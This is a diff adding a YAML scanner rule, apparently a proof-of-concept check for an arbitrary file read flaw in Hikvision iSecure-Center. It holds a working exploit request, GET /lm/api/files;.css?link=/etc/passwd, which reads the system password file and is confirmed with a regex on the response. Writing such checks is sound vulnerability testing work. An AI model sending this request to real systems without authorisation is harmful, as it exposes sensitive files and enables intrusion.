@@ -1,0 +1,18 @@
+id: hikvision-isecure-center-fileread
+
+info:
+    name: 海康威视综合安防 iSecure-Center 任意文件读取
+    author: a16
+    severity: high
+    verified: true
+    description: |
+        海康威视综合安防 iSecure-Center 存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /lm/api/files;.css?link=/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
+
